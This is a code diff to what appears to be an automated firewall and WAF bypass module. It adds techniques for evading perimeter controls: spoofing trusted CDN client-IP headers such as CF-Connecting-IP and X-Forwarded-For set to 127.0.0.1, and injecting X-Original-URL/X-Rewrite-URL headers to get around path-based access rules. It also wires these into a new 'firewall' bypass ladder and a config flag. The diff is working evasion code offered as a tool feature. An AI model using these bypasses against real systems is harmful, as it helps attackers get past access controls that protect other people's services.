@@ -205,6 +205,37 @@ def _rung_jitter_delay(payload: str, ctx: dict) -> BypassAttempt:
     return BypassAttempt(rung="jitter_delay", payload=payload, delay_seconds=random.uniform(0.4, 1.6))
 
 
+def _rung_trusted_cdn_ip(payload: str, ctx: dict) -> BypassAttempt:
+    # NGFWs sitting behind Cloudflare / Akamai / Fastly often honour the
+    # vendor client-IP header as if it were the connecting address.
+    return BypassAttempt(
+        rung="trusted_cdn_ip",
+        payload=payload,
+        extra_headers={
+            "CF-Connecting-IP": "127.0.0.1",
+            "True-Client-IP": "127.0.0.1",
+            "Fastly-Client-IP": "127.0.0.1",
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Real-IP": "127.0.0.1",
+        },
+    )
+
+
+def _rung_rewrite_url(payload: str, ctx: dict) -> BypassAttempt:
+    # Front-end ACL sees "/", origin routes the rewrite header. Used by
+    # the firewall-bypass module against path-based perimeter rules.
+    path = ctx.get("path") or ctx.get("hidden_path") or "/"
+    return BypassAttempt(
+        rung="rewrite_url",
+        payload=payload,
+        extra_headers={
+            "X-Original-URL": path,
+            "X-Rewrite-URL": path,
+            "X-Override-URL": path,
+        },
+    )
+
+
 # Ordered ladder. Earlier rungs are cheaper / less suspicious; later
 # rungs are more aggressive. The orchestrator tries them in this order
 # *until* a per-host learning ledger says otherwise.
@@ -225,6 +256,8 @@ DEFAULT_LADDER: List[Tuple[str, Callable[[str, dict], BypassAttempt]]] = [
     ("method_override", _rung_method_override),
     ("path_doubledot", _rung_path_traversal_doubledot),
     ("jitter_delay", _rung_jitter_delay),
+    ("trusted_cdn_ip", _rung_trusted_cdn_ip),
+    ("rewrite_url", _rung_rewrite_url),
 ]
 
 # Family-specific shortlists. We don't run SQL-comment rungs for a
@@ -295,6 +328,18 @@ FAMILY_LADDERS: Dict[str, List[str]] = {
         "ip_spoof_xff",
         "jitter_delay",
         "method_override",
+    ],
+    "firewall": [
+        "baseline",
+        "ip_spoof_xff",
+        "trusted_cdn_ip",
+        "rewrite_url",
+        "origin_spoof",
+        "method_override",
+        "url_encode",
+        "double_url_encode",
+        "path_doubledot",
+        "jitter_delay",
     ],
 }
 
@@ -499,6 +544,6 @@ def build_orchestrator(config: Optional[dict] = None) -> BypassOrchestrator:
     length; otherwise we cap at 8 to keep scan time bounded.
     """
     config = config or {}
-    if config.get("full_bypass") or config.get("waf_bypass"):
+    if config.get("full_bypass") or config.get("waf_bypass") or config.get("firewall_bypass"):
         return BypassOrchestrator(max_attempts=len(DEFAULT_LADDER))
     return BypassOrchestrator(max_attempts=8)
